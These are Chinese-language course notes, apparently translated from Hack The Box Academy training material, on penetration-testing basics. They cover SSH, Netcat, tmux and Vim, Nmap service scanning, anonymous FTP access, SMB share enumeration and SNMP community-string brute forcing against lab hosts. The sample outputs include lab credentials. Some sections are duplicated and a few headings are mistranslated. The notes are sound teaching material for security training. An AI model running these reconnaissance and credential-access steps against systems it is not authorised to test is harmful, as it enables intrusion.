在这里，我们为客户提供了一个文件夹，其中包含两个评估，即内部渗透测试 （IPT） 和外部渗透测试 （EPT）。在每个文件夹下，我们有用于保存扫描数据、任何相关工具、日志记录输出、范围信息（即要提供给我们的扫描工具的 IP/网络列表）的子文件夹，以及一个证据文件夹，该文件夹可能包含评估期间检索的任何凭据、检索的任何相关数据以及屏幕截图。\`Acme Company\`

这是个人喜好，但有些人为每个目标主机创建一个文件夹并在其中保存屏幕截图。其他人按主机或网络组织他们的笔记，并将屏幕截图直接保存到笔记工具中。尝试文件夹结构，看看什么最适合您保持井井有条并最高效地工作。

---

- # 使用 VPN 连接

---

  [虚拟专用网络 （VPN）](https://en.wikipedia.org/wiki/Virtual_private_network) 允许我们连接到专用（内部）网络并访问主机和资源，就像我们直接连接到目标专用网络一样。它是通过共享公共网络连接到专用网络（即员工从家中远程连接到公司网络）的安全通信通道。VPN 通过加密通道上的通信来防止窃听和访问通过通道的数据，从而提供一定程度的隐私和安全性。  

  ![图像](https://academy.hackthebox.com/storage/modules/77/GettingStarted.png){:height 556, :width 778}  

  概括地说，VPN 的工作原理是通过目标 VPN 的私人服务器而不是我们的互联网服务提供商 （ISP） 来路由我们连接设备的互联网连接。当连接到 VPN 时，数据来自 VPN 服务器而不是我们的计算机，并且看起来似乎来自我们自己的公共 IP 地址。  

  远程访问 VPN 有两种主要类型：基于客户端的 VPN 和 SSL VPN。SSL VPN 使用 Web 浏览器作为 VPN 客户端。在浏览器之间建立连接，SSL VPN 网关可以配置为仅允许访问基于 Web 的应用程序，例如电子邮件和内部网站，甚至内部网络，但不需要最终用户安装或使用任何专用软件。基于客户端的 VPN 需要使用客户端软件来建立 VPN 连接。连接后，用户的主机将像直接连接到公司网络一样工作，并且能够访问服务器配置允许的任何资源（应用程序、主机、子网等）。一些公司 VPN 将为员工提供对公司内部网络的完全访问权限，而另一些 VPN 会将用户放置在为远程工作人员保留的特定网段上。  

---

- # 基本工具

---

  工具是必不可少的，大多数信息安全专业人员每天都在使用。虽然这些工具不是为了成为渗透测试工具，但它们对渗透测试过程至关重要，因此我们必须掌握它们。  

- \`SSH\`\`Netcat\`\`Tmux\`\`Vim\`

---

- ## 使用 SSH
  
  [Secure Shell （SSH）](https://en.wikipedia.org/wiki/SSH_(Secure_Shell)) 是一种默认在端口上运行的网络协议，为系统管理员等用户提供了一种远程访问计算机的安全方式。SSH 可以配置密码身份验证，也可以使用 SSH 公钥/私钥对的[公钥身份验证](https://serverpilot.io/docs/how-to-use-ssh-public-key-authentication/)进行无密码配置。SSH 可用于通过 Internet 远程访问同一网络上的系统，使用端口转发/代理促进与其他网络中的资源的连接，以及向远程系统上传/下载文件。\`22\`  
  
  SSH 使用客户端-服务器模型，将运行 SSH 客户端应用程序（例如）的用户连接到 SSH 服务器。在攻击机器或进行实际评估时，我们通常会获得明文凭证或 SSH 私钥，这些凭证或 SSH 私钥可用于通过 SSH 直接连接到系统。SSH 连接通常比反向 shell 连接稳定得多，并且通常可以用作“跳转主机”来枚举和攻击网络中的其他主机、传输工具、设置持久性等。如果我们获取了一组凭证，我们可以使用 SSH 通过用户名远程服务器 IP 远程登录服务器，如下所示：\`OpenSSH\`\`@\`  
  
  \`\`\`
  [!bash!]**$** ssh Bob@10.10.10.10
  
  Bob@remotehost's password: *********
  
  Bob@remotehost#
  \`\`\`
  
  也可以在受感染的系统上读取本地私钥或添加我们的公钥以获得对特定用户的 SSH 访问权限，我们将在后面的部分中讨论。正如我们所看到的，SSH 是安全连接到远程机器的绝佳工具。它还提供了一种将远程计算机上的本地端口映射到我们的 localhost 的方法，这有时会变得很方便。  

---

- ## 使用 Netcat
  
  [Netcat](https://linux.die.net/man/1/nc) 或 是用于与 TCP/UDP 端互的出色网络实用程序。在渗透测试期间，它可以用于很多事情。它的主要用途是连接到 shell，我们将在本模块后面讨论。除此之外，还可用于连接到任何侦听端口并与该端口上运行的服务进行交互。例如，被编程为处理通过端口 22 的连接以发送所有数据和密钥。我们可以通过以下方式连接到 TCP 端口 22：\`ncat\`\`nc\`\`netcat\`\`SSH\`\`netcat\`  
  
  \`\`\`
  [!bash!]**$** netcat 10.10.10.10 22
  
  SSH-2.0-OpenSSH_8.4p1 Debian-3
  \`\`\`
  
  正如我们所看到的，端口 22 向我们发送了它的横幅，说明它正在运行。此技术称为 ，可帮助识别特定端口上运行的服务。 预装在大多数 Linux 发行版中。我们还[可以从此链接](https://nmap.org/download.html)下载 Windows 计算机的副本。还有另一种 Windows 替代方案，称为 [PowerCat](https://github.com/besimorhino/powercat)。 也可用于在机器之间传输文件，我们将在后面讨论。\`SSH\`\`Banner Grabbing\`\`Netcat\`\`netcat\`\`Netcat\`  
  
  另一个类似的网络实用程序是 [socat](https://linux.die.net/man/1/socat)，它有一些不支持的功能，例如转发端口和连接到串行设备。 还可用于[将 shell 升级为完全交互式 TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat)。我们将在后面的部分中看到一些示例。 是一个非常方便的实用程序，应该是每个渗透测试人员工具包的一部分。在获取远程代码执行后，可以将 的[独立二进制文件](https://github.com/andrew-d/static-binaries)传输到系统中，以获得更稳定的反向 shell 连接。\`netcat\`\`Socat\`\`Socat\`\`Socat\`  

---

- ## 使用 Tmux
  
  终端多路复用器（如 or）是扩展标准 Linux 终端功能的绝佳实用程序，例如在一个终端中拥有多个窗口并在它们之间跳转。让我们看看一些使用 的例子，这是两者中更常见的。如果我们的 Linux 系统上不存在，我们可以使用以下命令安装它：\`tmux\`\`Screen\`\`tmux\`\`tmux\`  
  
  \`\`\`
  [!bash!]**$** sudo apt install tmux -y
  \`\`\`
  
  一旦我们有了 ，我们就可以通过输入命令来启动它：\`tmux\`\`tmux\`![tmux_1](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_1.jpg)  
  
  输入命令 prefix 的默认键是 。为了在 中打开一个新窗口，我们可以点击前缀 'i.e. '，然后点击 ：\`tmux\`\`[CTRL + B]\`\`tmux\`\`[CTRL + B]\`\`C\`![tmux_2](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_2.jpg)  
  
  我们在底部看到编号的窗口。我们可以通过点击前缀然后输入窗口编号来切换到每个窗口，例如 或 .我们还可以通过点击前缀将窗口垂直拆分为多个窗格，然后按 ：\`0\`\`1\`\`[SHIFT + %]\`![tmux_3](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_3.jpg)  
  
  我们还可以通过点击前缀，然后按 ：\`[SHIFT + "]\`![tmux_4](https://academy.hackthebox.com/storage/modules/77/getting_started_tmux_4.jpg)  
  
  我们可以通过点击前缀，然后点击 or 箭头进行水平切换或 or 箭头进行垂直切换，从而在窗格之间切换。上面的命令涵盖了一些基本用法。它是一个强大的工具，可以用于许多事情，包括日志记录，这在任何技术参与中都非常重要。这个[作弊表](https://tmuxcheatsheet.com/)是一个非常方便的参考。此外，这个 [tmux 简介](https://www.youtube.com/watch?v=Lqehvpe_djs)视频值得您花时间。\`left\`\`right\`\`up\`\`down\`\`tmux\`\`ippsec\`  

---

- ## 使用 Vim
  
  [Vim](https://linuxcommand.org/lc3_man_pages/vim1.html) 是一个很棒的文本编辑器，可用于在 Linux 系统上编写代码或编辑文本文件。使用鼠标的一大好处是它完全依赖于键盘，因此您不必使用鼠标，这（一旦我们掌握了它）将显着提高您编写/编辑代码的生产力和效率。我们通常会找到或安装在受感染的 Linux 系统上，因此学习如何使用它使我们能够即使在远程系统上编辑文件。 还有许多其他功能，例如扩展和插件，可以显着扩展其使用并使其成为出色的代码编辑器。让我们看看 的一些基础知识。要使用 打开文件，我们可以在文件后添加文件名：\`Vim\`\`Vim\`\`Vi\`\`Vim\`\`Vim\`\`Vim\`  
  
  \`\`\`
  [!bash!]**$** vim /etc/hosts
  \`\`\`
  
  ![vim_1](https://academy.hackthebox.com/storage/modules/77/getting_started_vim_1.jpg)  
  
  如果我们要创建一个新文件，请输入新文件名，然后打开一个包含该文件的新窗口。打开文件后，我们处于 只读 ，这允许我们导航和读取文件。要编辑文件，我们按 输入 ，如 底部的 “” 所示。之后，我们可以移动文本光标并编辑文件：\`Vim\`\`normal mode\`\`i\`\`insert mode\`\`-- INSERT --\`\`Vim\`  
  
  ![vim_2](https://academy.hackthebox.com/storage/modules/77/getting_started_vim_2.jpg)  
  
  完成文件编辑后，我们可以按 Esc 键退出 ，返回 。当我们在 ，我们可以使用以下键来执行一些有用的快捷方式：\`esc\`\`insert mode\`\`normal mode\`\`normal mode\`  
  
  | 命令   | 描述                   |
  | ---- | -------------------- |
  | \`x\`  | 剪切字符                 |
  | \`dw\` | 剪切字                  |
  | \`dd\` | Cut full line （切割全线） |
  | \`yw\` | 复制单词                 |
  | \`yy\` | 复制整行                 |
  | \`p\`  | 糊                    |
  
  提示： 我们可以通过在命令前添加一个数字来将任何命令乘以多次运行。例如，'4yw' 将复制 4 个单词而不是 1 个单词，依此类推。  
  
  如果我们要 保存文件 或 退出 ，我们必须按 进入 .完成后，我们将在 vim 窗口底部看到我们键入的任何命令：\`Vim\`\`:\`\`command mode\`![vim_3](https://academy.hackthebox.com/storage/modules/77/getting_started_vim_3.jpg)  
  
  我们可以使用许多命令。以下是其中的一些：  
  
  | 命令    | 描述       |
  | ----- | -------- |
  | \`:1\`  | 转到第 1 行。 |
  | \`:w\`  | 写入文件，保存  |
  | \`:q\`  | 退出       |
  | \`:q!\` | 退出而不保存   |
  | \`:wq\` | 写入并退出    |
  
  \`Vim\`是一个非常强大的工具，并且具有许多其他命令和功能。此[备忘单](https://vimsheet.com/)是进一步释放 .\`Vim\`
  
  # 服务扫描

---

  我们已经准备好更进一步，开始探索机器！我们需要做的第一件事是确定操作系统和可能正在运行的任何可用服务。服务是在计算机上运行的应用程序，它为其他用户或计算机执行一些有用的功能。我们将这些托管这些有用服务的专用机器称为“服务器”而不是工作站，允许用户与这些不同的服务进行交互和使用。我们感兴趣的是配置错误或存在漏洞的服务。我们感兴趣的是，我们是否可以强制服务执行一些支持我们目标的意外操作，例如执行我们选择的命令，而不是执行作为服务一部分的预期操作。  

  为计算机分配一个 IP 地址，该地址允许它们在网络上被唯一标识和访问。可以为这些计算机上运行的服务分配一个端口号，以使服务可访问。如前所述，端口号的范围从 1 到 65,535，众所周知的端口 1 到 1,023 的范围是为特权服务保留的。端口 0 是 TCP/IP 网络中的保留端口，不用于 TCP 或 UDP 消息。如果有任何内容尝试绑定到端口 0（例如服务），它将绑定到端口 1,024 上方的下一个可用端口，因为端口 0 被视为“通配符”端口。  

  要远程访问服务，我们需要使用正确的 IP 地址和端口号进行连接，并使用服务可以理解的语言。手动检查所有 65,535 个端口以查找任何可用服务将非常费力，因此已经创建了工具来自动化此过程并为我们扫描端口范围。最常用的扫描工具之一是 Nmap（Network Mapper）。  

---

## Nmap

  让我们从最基本的扫描开始。假设我们要对位于 10.129.42.253 的目标执行基本扫描。为此，我们应该键入并按 return。我们看到扫描很快就完成了。这是因为如果我们不指定任何额外的选项，Nmap 默认只扫描 1,000 个最常见的端口。扫描输出显示端口 21、22、80、139 和 445 可用。\`nmap 10.129.42.253\`\`Nmap\`  

\`\`\`
  [!bash!]**$** nmap 10.129.42.253

  Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST
  Nmap scan report for 10.129.42.253
  Host is up (0.11s latency).
  Not shown: 995 closed ports
  PORT    STATE SERVICE
  21/tcp  open  ftp
  22/tcp  open  ssh
  80/tcp  open  http
  139/tcp open  netbios-ssn
  445/tcp open  microsoft-ds

  Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
\`\`\`

  在标题下，它还告诉我们这些是 TCP 端口。默认情况下，将执行 TCP 扫描，除非特别要求执行 UDP 扫描。  
  标题确认这些端口已打开。有时，我们会看到列出的其他端口具有不同的状态，例如 .如果防火墙仅允许从特定地址访问端口，则可能会发生这种情况。  
  标题告诉我们服务的名称通常映射到特定的端口号。但是，默认扫描不会告诉我们该端口上正在侦听什么。在我们指示与该服务交互并尝试梳理出识别信息之前，它可能完全是另一项服务。\`PORT\`\`Nmap\`\`STATE\`\`filtered\`\`SERVICE\`\`Nmap\`  

  随着我们逐渐熟悉，我们会注意到几个端口通常与 Windows 或 Linux 相关联。例如，端口 3389 是远程桌面服务的默认端口，可以很好地指示目标是 Windows 计算机。在我们当前场景中，端口 22 （SSH） 可用表示目标正在运行 Linux/Unix，但也可以在 Windows 上配置此服务。让我们运行更高级的扫描并收集有关目标设备的更多信息。\`Nmap\`  

  我们可以使用该参数来指定应该使用脚本来尝试获取更详细的信息。该参数指示执行版本扫描。在这次扫描中，Nmap 将对目标系统上的服务进行指纹识别，并识别服务协议、应用程序名称和版本。版本扫描以包含 1000 多个服务签名的综合数据库为基础。最后，告诉 Nmap 我们要扫描所有 65,535 个 TCP 端口。\`-sC\`\`Nmap\`\`-sV\`\`Nmap\`\`-p-\`  

\`\`\`
  [!bash!]**$** nmap -sV -sC -p- 10.129.42.253

  Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:18 EST
  Nmap scan report for 10.129.42.253
  Host is up (0.11s latency).
  Not shown: 65530 closed ports
  PORT    STATE SERVICE     VERSION
  21/tcp  open  ftp         vsftpd 3.0.3
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:10.10.14.2
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 2
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
  80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  |_http-title: PHP 7.4.3 - phpinfo()
  139/tcp open  netbios-ssn Samba smbd 4.6.2
  445/tcp open  netbios-ssn Samba smbd 4.6.2
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  Host script results:
  |_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  | smb2-security-mode: 
  |   2.02: 
  |_    Message signing enabled but not required
  | smb2-time: 
  |   date: 2021-02-25T21:21:51
  |_  start_date: N/A

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 233.68 seconds
\`\`\`

  这将返回更多信息。我们看到，扫描 65,535 个端口所花费的时间比扫描 1,000 个端口的时间要长得多。这些区域 and 选项还会增加扫描的持续时间，因为它们不会执行简单的 TCP 握手，而是执行更多的检查。我们注意到这次有一个 VERSION 标题，如果可以识别，它会报告服务版本和操作系统。\`-sC\`\`-sV\`  

  到目前为止，我们知道操作系统是 Ubuntu Linux。应用程序版本还可以帮助显示目标 OS 版本。以 OpenSSH 为例。我们看到报告的版本是 。从其他 Ubuntu SSH 包[更改日志](https://launchpad.net/ubuntu/yakkety/+source/openssh/+changelog)的检查中，我们看到发布版本采用格式。更新我们的版本以适应这种格式，我们得到 .在线快速搜索此版本显示它包含在 Ubuntu Linux Focal Fossa 20.04 中。\`OpenSSH 8.2p1 Ubuntu 4ubuntu0.1\`\`1:7.3p1-1ubuntu0.1\`\`1:8.2p1-4ubuntu0.1\`  

  ![谷歌1](https://academy.hackthebox.com/storage/modules/77/google1.png)  

  Another quick search reveals that the release date of this OS is April 23rd, 2020.  

  ![google2](https://academy.hackthebox.com/storage/modules/77/google2.png)  

  However, it is worth noting that this cross-referencing technique is not entirely reliable, as it is possible to install more recent application packages on an older OS version. The script scan flag causes to report the server headers page and the page title for any web page hosted on the webserver. The web page title indicates that this is a PHPInfo file, which is often manually created to confirm that PHP has been successfully installed. The title (and PHPInfo page) also reveals the PHP version, which is worth noting if it is vulnerable.\`-sC\`\`Nmap\`\`http-server-header\`\`http-title\`\`PHP 7.4.3 - phpinfo()\`  

     

  ![](https://academy.hackthebox.com/storage/modules/77/phpinfo.png)  

#### Nmap 脚本

  指定将针对目标运行许多有用的默认脚本，但在某些情况下需要运行特定脚本。例如，在评估范围内，系统可能会要求我们审核大型 Citrix 安装。我们可以使用[此](https://raw.githubusercontent.com/cyberstruggle/DeltaGroup/master/CVE-2019-19781/CVE-2019-19781.nse)脚本来审核严重的 Citrix NetScaler 漏洞 （[CVE-2019–19781](https://blog.rapid7.com/2020/01/17/active-exploitation-of-citrix-netscaler-cve-2019-19781-what-you-need-to-know/)），同时还可以使用其他脚本来审核 Citrix 安装。\`-sC\`\`Nmap\`\`Nmap\`  

\`\`\`
  [!bash!]**$** locate scripts/citrix

  /usr/share/nmap/scripts/citrix-brute-xml.nse
  /usr/share/nmap/scripts/citrix-enum-apps-xml.nse
  /usr/share/nmap/scripts/citrix-enum-apps.nse
  /usr/share/nmap/scripts/citrix-enum-servers-xml.nse
  /usr/share/nmap/scripts/citrix-enum-servers.nse
\`\`\`

  运行 Nmap 脚本的语法是 。\`nmap --script <script name> -p<port> <host>\`  

  \`Nmap\`脚本是增强扫描功能的好方法，检查可用选项将带来回报。查看[使用 Nmap 进行网络枚举](https://academy.hackthebox.com/module/details/19)模块，了解该工具的更详细研究。\`Nmap\`  

---

## 攻击网络服务

#### 横幅抓取

  如前所述，横幅抓取是一种快速对服务进行指纹识别的有用技术。通常，一旦启动连接，服务就会通过显示横幅来标识自己。如果指定了语法，Nmap 将尝试获取横幅。我们也可以使用 .让我们再举一个例子，使用 的版本 ：\`nmap -sV --script=banner <target>\`\`Netcat\`\`nc\`\`Netcat\`  

\`\`\`
  [!bash!]**$** nc -nv 10.129.42.253 21

  (UNKNOWN) [10.129.42.253] 21 (ftp) open
  220 (vsFTPd 3.0.3)
\`\`\`

  这表明服务器上的 版本为 。我们还可以使用强大的脚本引擎来自动化此过程：.\`vsFTPd\`\`3.0.3\`\`Nmap's\`\`nmap -sV --script=banner -p21 10.10.10.0/24\`  

#### FTP （自由贸易协定

  熟悉 FTP 是值得的，因为它是一种标准协议，并且此服务通常可以包含有趣的数据。扫描 FTP 的默认端口（21）会显示我们之前确定的 vsftpd 3.0.3 安装。此外，它还报告已启用匿名身份验证，并且目录可用。\`Nmap\`\`pub\`  

\`\`\`
  [!bash!]**$** nmap -sC -sV -p21 10.129.42.253

  Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 00:54 GMT
  Nmap scan report for 10.129.42.253
  Host is up (0.081s latency).

  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_drwxr-xr-x    2 ftp      ftp          4096 Dec 19 23:50 pub
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:10.10.14.2
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 3
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  Service Info: OS: Unix

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
\`\`\`

  Let us connect to the service using the command-line utility.\`ftp\`  

\`\`\`
  [!bash!]**$** ftp -p 10.129.42.253

  Connected to 10.129.42.253.
  220 (vsFTPd 3.0.3)
  Name (10.129.42.253:user): anonymous
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.

  ftp> ls
  227 Entering Passive Mode (10,129,42,253,158,60).
  150 Here comes the directory listing.
  drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
  226 Directory send OK.

  ftp> cd pub
  250 Directory successfully changed.

  ftp> ls
  227 Entering Passive Mode (10,129,42,253,182,129).
  150 Here comes the directory listing.
  -rw-r--r--    1 ftp      ftp            18 Feb 25 19:25 login.txt
  226 Directory send OK.

  ftp> get login.txt
  local: login.txt remote: login.txt
  227 Entering Passive Mode (10,129,42,253,181,53).
  150 Opening BINARY mode data connection for login.txt (18 bytes).
  226 Transfer complete.
  18 bytes received in 0.00 secs (165.8314 kB/s)

  ftp> exit
  221 Goodbye.
\`\`\`

  在上面的 shell 中，我们看到 FTP 支持常见的命令，例如 and，并允许我们使用该命令下载文件。检查下载的凭据会显示我们可以用来进一步访问系统的凭据。\`cd\`\`ls\`\`get\`\`login.txt\`  

\`\`\`
  [!bash!]**$** cat login.txt 

  admin:ftp@dmin123
\`\`\`

---

#### SMB （中小型企业）

  SMB（服务器消息块）是 Windows 计算机上流行的协议，它为垂直和横向移动提供了许多矢量。敏感数据（包括凭据）可能位于网络文件共享中，并且某些 SMB 版本可能容易受到 RCE 漏洞（如 [EternalBlue](https://www.avast.com/c-eternalblue)）的攻击。仔细列举这个相当大的潜在攻击面至关重要。 有许多用于枚举 SMB 的脚本，例如 [smb-os-discovery.nse](https://nmap.org/nsedoc/scripts/smb-os-discovery.html)，它将与 SMB 服务交互以提取报告的操作系统版本。\`Nmap\`  

\`\`\`
  [!bash!]**$** nmap --script smb-os-discovery.nse -p445 10.10.10.40

  Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT
  Nmap scan report for doctors.htb (10.10.10.40)
  Host is up (0.022s latency).

  PORT    STATE SERVICE
  445/tcp open  microsoft-ds

  Host script results:
  | smb-os-discovery: 
  |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
  |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
  |   Computer name: CEO-PC
  |   NetBIOS computer name: CEO-PC\\x00
  |   Workgroup: WORKGROUP\\x00
  |_  System time: 2020-12-27T00:59:46+00:00

  Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
\`\`\`

  在这种情况下，主机运行的是旧版 Windows 7 操作系统，我们可以进行进一步的枚举以确认它是否容易受到 EternalBlue 的攻击。Metasploit 框架有几个用于 EternalBlue 的[模块](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)，可用于验证漏洞并利用它，我们将在下一节中看到。我们可以针对此模块的目标部分运行扫描，以从 SMB 服务收集信息。我们可以确定主机运行的是 Linux 内核，Samba 版本 4.6.2，主机名是 GS-SVCSCAN。  

\`\`\`
  [!bash!]**$** nmap -A -p445 10.129.42.253

  Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST
  Nmap scan report for 10.129.42.253
  Host is up (0.11s latency).

  PORT    STATE SERVICE     VERSION
  445/tcp open  netbios-ssn Samba smbd 4.6.2
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
  No exact OS matches for host (test conditions non-ideal).
  Network Distance: 2 hops

  Host script results:
  |_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  | smb2-security-mode: 
  |   2.02: 
  |_    Message signing enabled but not required
  | smb2-time: 
  |   date: 2021-02-25T21:30:06
  |_  start_date: N/A

  TRACEROUTE (using port 445/tcp)
  HOP RTT       ADDRESS
  1   111.62 ms 10.10.14.1
  2   111.89 ms 10.129.42.253

  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
\`\`\`

---

#### 股票

  SMB 允许用户和管理员共享文件夹，并允许其他用户远程访问这些文件夹。这些共享通常包含包含敏感信息（如密码）的文件。[smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) 是一种可以枚举 SMB 共享并与之交互的工具。该标志指定我们要检索远程主机上的可用共享列表，同时禁止显示密码提示。\`-L\`\`-N\`  

\`\`\`
  [!bash!]**$** smbclient -N -L \\\\\\\\10.129.42.253

  Sharename       Type      Comment
  ---------       ----      -------
  print**$**          Disk      Printer Drivers
  users           Disk      
  IPC**$**            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
  SMB1 disabled -- no workgroup available
\`\`\`

  这将显示非默认共享 。让我们尝试以 guest 用户身份进行连接。\`users\`  

\`\`\`
  [!bash!]**$** smbclient \\\\\\\\10.129.42.253\\\\users

  Enter WORKGROUP\\users's password: 
  Try "help" to get a list of possible commands.

  smb: \\> ls
  NT_STATUS_ACCESS_DENIED listing \\*

  smb: \\> exit
\`\`\`

  该命令导致 access denied 消息，指示不允许 guest 访问。让我们使用用户 bob （） 的凭证重试。\`ls\`\`bob:Welcome1\`  

\`\`\`
  [!bash!]**$** smbclient -U bob \\\\\\\\10.129.42.253\\\\users

  Enter WORKGROUP\\bob's password: 
  Try "help" to get a list of possible commands.

  smb: \\> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 15:05:31 2021
  bob                                 D        0  Thu Feb 25 16:42:23 2021

  4062912 blocks of size 1024. 1332480 blocks available

  smb: \\> cd bob

  smb: \\bob\\> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 16:42:23 2021
  passwords.txt                       N      156  Thu Feb 25 16:42:23 2021

  4062912 blocks of size 1024. 1332480 blocks available

  smb: \\bob\\> get passwords.txt 
  getting file \\bob\\passwords.txt of size 156 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
\`\`\`

  我们成功地使用凭据访问了共享，并获得了对 感兴趣文件的访问权限 ，可以使用命令下载该文件。\`users\`\`passwords.txt\`\`get\`  

---

#### SNMP （SNMP 协议）

  SNMP 社区字符串提供有关路由器或设备的信息和统计信息，帮助我们访问它。制造商默认的社区字符串 和 通常保持不变。在 SNMP 版本 1 和 2c 中，使用纯文本社区字符串控制访问，如果我们知道名称，就可以访问它。加密和身份验证仅在 SNMP 版本 3 中添加。可以从 SNMP 获得很多信息。检查进程参数可能会发现在命令行上传递的凭证，鉴于企业环境中密码重用的普遍性，这些凭证可能可以重新用于其他外部可访问的服务。路由信息、绑定到其他接口的服务以及已安装软件的版本也会被揭示。\`public\`\`private\`  

\`\`\`
  [!bash!]**$** snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

  iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
\`\`\`

\`\`\`
  [!bash!]**$** snmpwalk -v 2c -c private  10.129.42.253 

  Timeout: No Response from 10.129.42.253
\`\`\`

  可以使用 [onesixtyone](https://github.com/trailofbits/onesixtyone) 等工具使用常见社区字符串的字典文件（例如该工具的 GitHub 存储库中包含的文件）暴力破解社区字符串名称。\`dict.txt\`  

\`\`\`
  [!bash!]**$** onesixtyone -c dict.txt 10.129.42.254

  Scanning 1 hosts, 51 communities
  10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic **#**74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
\`\`\`

---

## 结论

  服务扫描和枚举是一个广阔的主题，我们将随着我们的学习而更多地了解它。我们在这里介绍的方面适用于许多网络，包括 HTB 机器。

# 基本工具

---

  工具是必不可少的，大多数信息安全专业人员每天都在使用。虽然这些工具不是为了成为渗透测试工具，但它们对渗透测试过程至关重要，因此我们必须掌握它们。  
\`SSH\`\`Netcat\`\`Tmux\`\`Vim\`

---

## 使用 SSH

  [Secure Shell （SSH）](https://en.wikipedia.org/wiki/SSH_(Secure_Shell)) 是一种默认在端口上运行的网络协议，为系统管理员等用户提供了一种远程访问计算机的安全方式。SSH 可以配置密码身份验证，也可以使用 SSH 公钥/私钥对的[公钥身份验证](https://serverpilot.io/docs/how-to-use-ssh-public-key-authentication/)进行无密码配置。SSH 可用于通过 Internet 远程访问同一网络上的系统，使用端口转发/代理促进与其他网络中的资源的连接，以及向远程系统上传/下载文件。\`22\`  

  SSH 使用客户端-服务器模型，将运行 SSH 客户端应用程序（例如）的用户连接到 SSH 服务器。在攻击机器或进行实际评估时，我们通常会获得明文凭证或 SSH 私钥，这些凭证或 SSH 私钥可用于通过 SSH 直接连接到系统。SSH 连接通常比反向 shell 连接稳定得多，并且通常可以用作“跳转主机”来枚举和攻击网络中的其他主机、传输工具、设置持久性等。如果我们获取了一组凭证，我们可以使用 SSH 通过用户名远程服务器 IP 远程登录服务器，如下所示：\`OpenSSH\`\`@\`  

\`\`\`
  [!bash!]**$** ssh Bob@10.10.10.10

  Bob@remotehost's password: *********

  Bob@remotehost#
\`\`\`

  也可以在受感染的系统上读取本地私钥或添加我们的公钥以获得对特定用户的 SSH 访问权限，我们将在后面的部分中讨论。正如我们所看到的，SSH 是安全连接到远程机器的绝佳工具。它还提供了一种将远程计算机上的本地端口映射到我们的 localhost 的方法，这有时会变得很方便。  

---

## 使用 Netcat

  [Netcat](https://linux.die.net/man/1/nc) 或 是用于与 TCP/UDP 端互的出色网络实用程序。在渗透测试期间，它可以用于很多事情。它的主要用途是连接到 shell，我们将在本模块后面讨论。除此之外，还可用于连接到任何侦听端口并与该端口上运行的服务进行交互。例如，被编程为处理通过端口 22 的连接以发送所有数据和密钥。我们可以通过以下方式连接到 TCP 端口 22：\`ncat\`\`nc\`\`netcat\`\`SSH\`\`netcat\`  

\`\`\`
  [!bash!]**$** netcat 10.10.10.10 22

  SSH-2.0-OpenSSH_8.4p1 Debian-3
\`\`\`

